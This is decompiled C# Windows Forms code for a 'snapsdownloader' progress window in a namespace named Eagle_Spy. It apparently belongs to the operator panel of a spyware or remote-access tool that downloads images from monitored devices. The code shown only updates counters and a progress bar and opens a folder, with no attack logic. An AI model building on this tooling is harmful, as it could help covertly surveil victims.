using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x020000AA RID: 170
	[DesignerGenerated]
	public partial class snapsdownloader : Form
	{
		// Token: 0x06000900 RID: 2304 RVA: 0x000050A9 File Offset: 0x000032A9
		public snapsdownloader()
		{
			base.Load += this.Snapsdownloader_Load;
			this.imageCounter = 0;
			this.totalImages = 0;
			this.Downloadfolder = "";
			this.InitializeComponent();
		}

		// Token: 0x06000901 RID: 2305 RVA: 0x000DD3AC File Offset: 0x000DB5AC
		private void Snapsdownloader_Load(object sender, EventArgs e)
		{
			base.Visible = true;
			base.Location = checked(new Point(Screen.PrimaryScreen.WorkingArea.Width - base.Width, Screen.PrimaryScreen.WorkingArea.Height - base.Height));
		}

		// Token: 0x06000902 RID: 2306 RVA: 0x000DD400 File Offset: 0x000DB600
		public void UpdateProgressBar()
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new VB_0024AnonymousDelegate_0(delegate
				{
					this.UpdateProgressBar();
				}));
				return;
			}
			checked
			{
				int num = (int)Math.Round(unchecked((double)this.imageCounter / (double)this.totalImages * 100.0));
				this.Bbar.Value = num;
				this.finishedtext.Text = "-> Finished: " + this.imageCounter.ToString();
				this.lefttext.Text = "-> Left: " + (this.totalImages - this.imageCounter).ToString();
				if (this.Bbar.Value == this.Bbar.Maximum)
				{
					this.statustext.Text = "-> Status : Done.";
					return;
				}
				this.statustext.Text = "-> Status : Downloading...";
			}
		}

		// Token: 0x06000903 RID: 2307 RVA: 0x000050E2 File Offset: 0x000032E2
		private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
		{
			if (this.Bbar.Value == this.Bbar.Maximum || Codes.MyMsgBox("Alert", "Exit without finish download ?", true, Resources.information48px))
			{
				base.Close();
			}
		}

		// Token: 0x06000904 RID: 2308 RVA: 0x00005119 File Offset: 0x00003319
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (Directory.Exists(this.Downloadfolder))
			{
				Process.Start(this.Downloadfolder);
			}
		}

		// Token: 0x04000AB0 RID: 2736
		public int imageCounter;

		// Token: 0x04000AB1 RID: 2737
		public int totalImages;

		// Token: 0x04000AB2 RID: 2738
		public string Downloadfolder;
	}
}
